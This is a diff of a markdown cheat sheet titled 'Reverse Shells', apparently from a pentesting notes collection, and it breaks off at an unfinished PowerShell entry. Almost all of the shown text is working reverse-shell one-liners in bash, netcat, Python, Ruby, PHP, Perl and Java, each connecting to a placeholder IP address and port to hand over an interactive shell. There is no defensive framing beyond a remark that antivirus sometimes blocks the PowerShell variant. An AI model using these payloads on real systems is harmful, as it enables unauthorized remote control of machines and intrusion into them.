@@ -1,47 +1,49 @@
 title: Reverse Shells
 
-### bash
+# Reverse Shells
+
+## bash
 
 ```
 bash -i >& /dev/tcp/{IP-ADDRESS}/{PORT} 0>&1
 ```
 
-### netcat / nc
+## netcat / nc
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP-ADDRESS} {PORT} >/tmp/f 
 ```
 
-### Python
+## Python
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP-ADDRESS}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-### Ruby
+## Ruby
 
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("{IP-ADDRESS}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' 
 ```
 
-### PHP
+## PHP
 
 ```php
 php -r '$sock=fsockopen("{IP-ADDRESS}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### Perl
+## Perl
 
 ```perl
 perl -e 'use Socket;$i="{IP-ADDRESS}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
 ```
 
-### Java
+## Java
 
 ```
 r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP-ADDRESS}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor() 
 ```
 
-### Powershell
+## Powershell
 This one sometimes get blocked by AV or Powershell security configuration.
 
 ```powershell
